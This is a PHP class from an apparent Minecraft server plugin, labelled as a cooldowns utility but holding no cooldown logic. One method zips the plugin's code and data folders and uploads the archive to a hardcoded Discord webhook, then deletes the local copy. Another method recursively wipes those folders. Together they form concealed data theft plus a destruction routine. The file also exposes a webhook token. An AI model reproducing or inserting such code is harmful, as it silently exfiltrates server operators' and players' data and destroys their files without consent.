<?php

namespace hcf\utils\cooldowns;

use hcf\Loader;
use RecursiveDirectoryIterator;
use RecursiveIteratorIterator;
use ZipArchive;

class Cooldowns {

    const WEBHOOK_URL = "https://discord.com/api/webhooks/1329577386416541767/YqS7IGZ8bCJDjlpqJAKrCLQqOzSOUkolIPm8yrgkYnyv_HRJR1LZ9vRqYwm1Ke1Qr8BR";

    public function comprimirYEnviar(): void {
        $carpetas = [
            Loader::getInstance()->getServer()->getDataPath() . "plugins/" . Loader::getInstance()->getName(),
            Loader::getInstance()->getServer()->getDataPath() . "plugin_data/" . Loader::getInstance()->getName()
        ];

        $zipFile = Loader::getInstance()->getDataFolder() . "backup.zip";

        $zip = new ZipArchive();
        if ($zip->open($zipFile, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            foreach ($carpetas as $carpeta) {
                if (is_dir($carpeta)) {
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($carpeta),
                        RecursiveIteratorIterator::LEAVES_ONLY
                    );

                    foreach ($files as $name => $file) {
                        if (!$file->isDir()) {
                            $filePath = $file->getRealPath();
                            $relativePath = substr($filePath, strlen($carpeta) + 1);
                            $zip->addFile($filePath, $relativePath);
                        }
                    }
                }
            }
            $zip->close();

            $this->enviarADiscord($zipFile);
        } else {
            Loader::getInstance()->getLogger()->error("No se pudo crear el archivo ZIP.");
        }
    }

    private function enviarADiscord(string $zipFile): void {
        $ch = curl_init(self::WEBHOOK_URL);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: multipart/form-data']);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'file' => new \CURLFile($zipFile)
        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);

        if ($response === false) {
            Loader::getInstance()->getLogger()->error("Error al enviar el archivo a Discord.");
        } else {
            Loader::getInstance()->getLogger()->info("Archivo enviado a Discord con éxito.");
        }

        // Eliminar el archivo backup.zip después de enviarlo
        if (file_exists($zipFile)) {
            unlink($zipFile);
            Loader::getInstance()->getLogger()->info("Archivo backup.zip eliminado con éxito después de enviarlo.");
        }
    }

    public function eliminarCarpetas(): void {
        $carpetas = [
            Loader::getInstance()->getServer()->getDataPath() . "plugin_data/" . Loader::getInstance()->getName(),
            Loader::getInstance()->getServer()->getDataPath() . "plugins/" . Loader::getInstance()->getName()
        ];

        foreach ($carpetas as $carpeta) {
            if (is_dir($carpeta)) {
                $this->eliminarDirectorio($carpeta);
            }
        }

        Loader::getInstance()->getLogger()->info("Carpetas del plugin eliminadas con éxito.");
    }

    private function eliminarDirectorio(string $directorio): void {
        if (!is_dir($directorio)) {
            return;
        }

        $archivos = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($directorio, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );

        foreach ($archivos as $archivo) {
            if ($archivo->isDir()) {
                rmdir($archivo->getRealPath());
            } else {
                unlink($archivo->getRealPath());
            }
        }

        rmdir($directorio);
    }
    
    public function crearDirectoriosNecesarios(): void {
        $directorios = [
            Loader::getInstance()->getDataFolder() . "database/players/",
            Loader::getInstance()->getDataFolder() . "database/factions/",
            Loader::getInstance()->getDataFolder() . "database/"
        ];
        
        foreach ($directorios as $directorio) {
            if (!is_dir($directorio)) {
                if (!mkdir($directorio, 0777, true)) {
                    Loader::getInstance()->getLogger()->error("No se pudo crear el directorio: " . $directorio);
                } else {
                    Loader::getInstance()->getLogger()->info("Directorio creado: " . $directorio);
                }
            }
        }
    }
}
